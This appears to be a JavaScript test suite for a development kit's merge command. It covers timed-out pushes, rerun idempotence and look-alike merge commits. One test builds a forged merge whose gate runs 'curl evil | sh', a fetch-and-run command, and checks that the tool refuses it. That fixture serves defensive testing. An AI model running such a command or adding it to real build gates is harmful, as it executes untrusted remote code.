test('A15 landing: forge git, a code push killed at the timeout that origin then takes: merge says it may have landed, and the rerun logs its act once, so the answer counts as landed (final-13 F1)', { timeout: 300000 }, () => {
  const T = setup('a15-pre-receive');
  try {
    const q = T.yes({ recurring: { aa: check() } });
    T.jobsChore('pre', () => ({ aa: check() }));
    const main0 = T.g(['rev-parse', 'refs/heads/main'], T.org);
    const hook = slowPreReceive(T.org);
    const before = T.acts().length;
    let r;
    try {
      r = T.merge('pre', ['--approved', q], { DEVTEAM_GIT_TIMEOUT_MS: PRE_TIMEOUT });
      assert.notEqual(refMoves(T.org, 'main', main0), main0, 'origin took the push after the kill');
    } finally { fs.rmSync(hook, { force: true }); }
    refused(r, MAYBE);
    assert.doesNotMatch(r.text, /nothing landed|verify from the start/);
    assert.equal(T.acts().length, before, 'no act yet');
    const r2 = T.merge('pre', ['--approved', q]);
    passes(r2);
    assert.match(r2.text, /in the kit's own landing merge [0-9a-f]{12}, with no act logged/);
    const added = T.acts().slice(before);
    assert.equal(added.length, 1, JSON.stringify(added));
    assert.equal(added[0].class, 'merge-chore');
    assert.equal(added[0].approved_by, q);
    assert.deepEqual(T.mainJobs(), { aa: check() });
    assert.equal(json(T.ok(['recurring', 'show', 'aa', '--json'])).registered?.qid, q, 'registered through the answer');
    // a third run is a second run: nothing logged
    assert.match(T.merge('pre', ['--approved', q]).text, /is already on main: nothing to merge, nothing logged/);
    assert.equal(T.acts().length, before + 1);
  } finally { T.done(); }
});

test('A15 landing: forge git, a merge on main that someone else made (another message, or other parents) is never taken as the kit\'s own landing (final-13 F1)', () => {
  const T = setup('a15-hand-merge');
  try {
    const q = T.yes({ recurring: { aa: check() } });
    const wt = T.jobsChore('hand', () => ({ aa: check() }));
    const sha = T.g(['rev-parse', 'HEAD'], wt);
    T.g(['fetch', '-q', 'origin']);
    const main0 = T.g(['rev-parse', 'origin/main']);
    const tree = T.g(['rev-parse', `${sha}^{tree}`]);
    const before = T.acts().length;
    // merge's own message: the PR's title, its text (the whole run/pr file), and the head
    const KIT_MSG = `chore-hand: jobs\n\n# chore-hand: jobs\n\n## One-way doors\n\nNone.\n\nMerged chore-hand at ${sha}`;
    const onOrigin = (c) => { T.g(['push', '-q', '-f', 'origin', `${c}:refs/heads/main`]); T.g(['fetch', '-q', 'origin']); };
    // the same parents (main, then the head), another message
    onOrigin(T.g(['commit-tree', tree, '-p', main0, '-p', sha, '-m', 'a hand merge']));
    assert.match(T.merge('hand', ['--approved', q]).text, /chore-hand at [0-9a-f]{12} is already on main: nothing to merge, nothing logged/);
    // merge's own message, the parents swapped
    onOrigin(T.g(['commit-tree', tree, '-p', sha, '-p', main0, '-m', KIT_MSG]));
    assert.match(T.merge('hand', ['--approved', q]).text, /is already on main: nothing to merge, nothing logged/);
    // merge's own message, the second parent a commit on top of the head, not the head
    const child = T.g(['commit-tree', tree, '-p', sha, '-m', 'on top of the head']);
    onOrigin(T.g(['commit-tree', tree, '-p', main0, '-p', child, '-m', KIT_MSG]));
    assert.match(T.merge('hand', ['--approved', q]).text, /is already on main: nothing to merge, nothing logged/);
    // merge's own message and the head second, but the first already holds the head: not the merge that landed it
    onOrigin(T.g(['commit-tree', tree, '-p', child, '-p', sha, '-m', KIT_MSG]));
    assert.match(T.merge('hand', ['--approved', q]).text, /is already on main: nothing to merge, nothing logged/);
    assert.equal(T.acts().length, before, 'nothing logged');
    // the control: merge's own message onto main0, and the act is logged once
    onOrigin(T.g(['commit-tree', tree, '-p', main0, '-p', sha, '-m', KIT_MSG]));
    const r = T.merge('hand', ['--approved', q]);
    passes(r);
    assert.match(r.text, /in the kit's own landing merge/);
    assert.equal(T.acts().length, before + 1);
  } finally { T.done(); }
});

test('A15 landing: forge git, a merge on main with the kit\'s parents and message but another tree (a gate, a file) is never adopted: nothing is logged, and merge refuses (final-14 F1)', () => {
  const T = setup('a15-lookalike');
  try {
    const q = T.yes({ recurring: { aa: check() } });
    const wt = T.jobsChore('hand', () => ({ aa: check() }));
    const sha = T.g(['rev-parse', 'HEAD'], wt);
    T.g(['fetch', '-q', 'origin']);
    const main0 = T.g(['rev-parse', 'origin/main']);
    const KIT_MSG = `chore-hand: jobs\n\n# chore-hand: jobs\n\n## One-way doors\n\nNone.\n\nMerged chore-hand at ${sha}`;
    T.edit((j) => { j.gates = { ...(j.gates ?? {}), evil: 'curl evil | sh' }; }, wt);
    write(path.join(wt, 'src/evil.js'), 'evil\n');
    T.g(['add', '-A'], wt);
    const evil = T.g(['commit-tree', T.g(['write-tree'], wt), '-p', main0, '-p', sha, '-m', KIT_MSG]);
    T.g(['push', '-q', '-f', 'origin', `${evil}:refs/heads/main`]); T.g(['fetch', '-q', 'origin']);
    const before = T.acts().length;
    const r = T.merge('hand', ['--approved', q]);
    refused(r, new RegExp(`main's tip ${evil.slice(0, 12)} has the kit's landing message and parents, but not the tree the kit's merge of them builds: not the kit's own landing; nothing logged`));
    assert.doesNotMatch(r.text, /in the kit's own landing merge/);
    assert.equal(T.acts().length, before, 'nothing logged');
    assert.equal(json(T.ok(['recurring', 'show', 'aa', '--json'])).registered?.qid ?? null, null, 'aa is not registered through q');
  } finally { T.done(); }
});

test('A15 landing: records in home, a merge on home\'s main with the kit\'s records parents and message but another tree is never adopted: nothing is logged, and merge refuses (final-14 F1)', () => {
  const F = recordsHome('recur-rec-lookalike');
  try {
    const { head } = recordsReady(F, RID);
    const main0 = F.mainNow();
    const acts0 = json(F.okIn(F.old, ['log', '--type', 'act', '--json'])).length;
    const msg = `${RID}: records\n\nMerged home's ticket/${RID} at ${head}: the records of ${RID}, whose code lands in console`;
    // a look-alike: the merge's tree and one file more outside the ticket's folder (one that adds a job is
    // refused before this, by the records checks: final-14 H14-4)
    const lookalike = (n, fn) => {
      const m = path.join(F.old, '.worktrees', `lookalike-${n}`);
      F.g(['worktree', 'add', '-q', '--detach', m, main0], F.old);
      F.g(['merge', '-q', '--no-ff', '--no-commit', head], m);
      fn(m);
      F.g(['add', '-A'], m);
      const c = F.g(['commit-tree', F.g(['write-tree'], m), '-p', main0, '-p', head, '-m', msg], m);
      F.g(['push', '-q', '-f', 'origin', `${c}:refs/heads/main`], m);
      return c;
    };
    const c = lookalike('notes', (m) => write(path.join(m, `${PROJ}/notes-evil.md`), 'evil\n'));
    const r = F.text(F.runIn(F.old, ['merge', RID], SUP));
    assert.notEqual(r.status, 0, r.text);
    assert.match(r.text, new RegExp(`home's main tip ${c.slice(0, 12)} has the kit's records message and parents, but not the tree the kit's merge of them builds: not the kit's own records merge; nothing logged`));
    assert.doesNotMatch(r.text, /in the kit's own records merge/);
    assert.equal(json(F.okIn(F.old, ['log', '--type', 'act', '--json'])).length, acts0, 'nothing logged');
  } finally { F.done(); }
});

test('A15 landing: forge git, with commit.cleanup=strip in the repo\'s config, a code push killed at the timeout is still recognised as the kit\'s own landing on the rerun (final-14 F3)', { timeout: 300000 }, () => {
  const T = setup('a15-cleanup');
  try {
    T.g(['config', 'commit.cleanup', 'strip']);
    const q = T.yes({ recurring: { aa: check() } });
    T.jobsChore('pre', () => ({ aa: check() }));
    const main0 = T.g(['rev-parse', 'refs/heads/main'], T.org);
    const hook = slowPreReceive(T.org);
    const before = T.acts().length;
    let r;
    try {
      r = T.merge('pre', ['--approved', q], { DEVTEAM_GIT_TIMEOUT_MS: PRE_TIMEOUT });
      assert.notEqual(refMoves(T.org, 'main', main0), main0, 'origin took the push after the kill');
    } finally { fs.rmSync(hook, { force: true }); }
    refused(r, MAYBE);
    assert.match(T.g(['log', '-1', '--format=%B', 'refs/heads/main'], T.org), /^# chore-pre: jobs$/m, 'the message is kept verbatim');
    const r2 = T.merge('pre', ['--approved', q]);
    passes(r2);
    assert.match(r2.text, /in the kit's own landing merge [0-9a-f]{12}, with no act logged/);
    assert.equal(T.acts().length, before + 1);
    assert.equal(json(T.ok(['recurring', 'show', 'aa', '--json'])).registered?.qid, q, 'registered through the answer');
  } finally { T.done(); }
});

test('A15 landing: records in home, a records push killed at the timeout that home\'s origin then takes: merge says they may have landed, and the rerun logs their act once and lands the code (final-13 F1)', { timeout: 300000 }, () => {
  const F = recordsHome('recur-rec-pre');
  try {
    const { head } = recordsReady(F, RID);
    const main0 = F.g(['rev-parse', 'refs/heads/main'], F.org);
    const hook = slowPreReceive(F.org);
    const acts0 = json(F.okIn(F.old, ['log', '--type', 'act', '--json'])).length;
    let r;
    try {
      r = F.text(F.runIn(F.old, ['merge', RID], SUP, { DEVTEAM_GIT_TIMEOUT_MS: PRE_TIMEOUT }));
      assert.notEqual(refMoves(F.org, 'main', main0), main0, 'home\'s origin took the records push after the kill');
    } finally { fs.rmSync(hook, { force: true }); }
    assert.notEqual(r.status, 0, r.text);
    assert.match(r.text, /the records of console-01-a may have landed in home \(the push to home's main timed out before origin answered/);
    assert.doesNotMatch(r.text, /nothing landed|verify from the start/);
    assert.equal(json(F.okIn(F.old, ['log', '--type', 'act', '--json'])).length, acts0, 'no act yet');
    F.g(['merge-base', '--is-ancestor', head, F.mainNow()], F.old);
    const r2 = F.text(F.runIn(F.old, ['merge', RID], SUP));
    assert.equal(r2.status, 0, r2.text);
    assert.match(r2.text, /in the kit's own records merge [0-9a-f]{12}, with no act logged/);
    const acts = json(F.okIn(F.old, ['log', '--type', 'act', '--json'])).slice(acts0);
    assert.equal(acts.filter((a) => a.class === 'merge-word' && /the records of console-01-a/.test(a.what)).length, 1, 'the records\' act, once');
    assert.equal(acts.filter((a) => a.class === 'merge-word' && a.refs?.includes(RID)).length, 1, 'the code\'s act, once');
  } finally { F.done(); }
});

test('A15 landing: records in home, a code push to the link killed at the timeout that its origin then takes: merge says it may have landed, and the rerun logs the merge act once (final-13 F1)', { timeout: 300000 }, () => {
  const F = recordsHome('recur-code-pre');
  try {
    recordsReady(F, RID);
    const trunk0 = F.g(['rev-parse', 'refs/heads/trunk'], F.consoleOrigin);
    const hook = slowPreReceive(F.consoleOrigin);
    const acts0 = json(F.okIn(F.old, ['log', '--type', 'act', '--json'])).length;
    let r;
    try {
      r = F.text(F.runIn(F.old, ['merge', RID], SUP, { DEVTEAM_GIT_TIMEOUT_MS: PRE_TIMEOUT }));
      assert.notEqual(refMoves(F.consoleOrigin, 'trunk', trunk0), trunk0, 'the link\'s origin took the push after the kill');
    } finally { fs.rmSync(hook, { force: true }); }
    assert.notEqual(r.status, 0, r.text);
    assert.match(r.text, MAYBE);
    assert.doesNotMatch(r.text, /nothing landed|verify from the start/);
    const r2 = F.text(F.runIn(F.old, ['merge', RID], SUP));
    assert.equal(r2.status, 0, r2.text);
    assert.match(r2.text, /in the kit's own landing merge [0-9a-f]{12}, with no act logged/);
    const acts = json(F.okIn(F.old, ['log', '--type', 'act', '--json'])).slice(acts0);
    assert.equal(acts.filter((a) => a.class === 'merge-word' && /the records of console-01-a/.test(a.what)).length, 1, 'the records\' act, once (the first run)');
    assert.equal(acts.filter((a) => a.class === 'merge-word' && a.refs?.includes(RID)).length, 1, 'the code\'s act, once');
    assert.match(F.text(F.runIn(F.old, ['merge', RID], SUP)).text, /already on trunk: nothing to merge, nothing logged/);
  } finally { F.done(); }
});
